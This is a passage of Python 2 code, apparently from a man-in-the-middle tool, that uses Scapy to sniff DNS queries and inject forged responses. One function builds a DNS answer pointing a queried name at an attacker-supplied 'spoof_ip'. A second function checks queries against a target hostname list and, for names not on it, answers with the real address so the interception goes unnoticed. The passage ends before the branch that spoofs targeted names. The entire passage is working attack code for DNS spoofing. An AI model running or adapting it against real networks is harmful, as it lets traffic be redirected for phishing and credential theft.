
        def mkdnsresponse4(self,  request,  spoof_ip):               
                dns_rr = DNSRR(rrname=request.qd.qname,  ttl=220,  type= 1,  rdlen=4,  rdata=spoof_ip)                                
                response = DNS(id=request.id,  qr=1L, rd=1, ra=1, qdcount=1,  ancount=1,  qd=request.qd,  an=dns_rr)
                return response

        def handle_dns_req(self,  pkt):
                if pkt.getlayer(DNS) and pkt[DNS].qd and not pkt[DNS].an:

                    # should this hostname be spoofed?
                    if 'hostnames' in self.parameters.keys():
                        if not pkt[DNS].qd.qname.rstrip('.') in self.parameters['hostnames'].split(','):
                            # return original ip address
                            
                            # is this an ipv4 request?
                            if pkt[DNS].qd.qtype == IPV4_QUERY:
                                try:
                                    valid_ip = gethostbyname(pkt[DNS].qd.qname)
                                    response = self.mkdnsresponse4(pkt[DNS],  valid_ip)  
                                    p = IPv4(src=pkt[IPv4].dst, dst=pkt[IPv4].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
                                except:
                                    p = None                                                                                             
                            
                            if p:
                                send(p,  verbose=0)                             
                                return
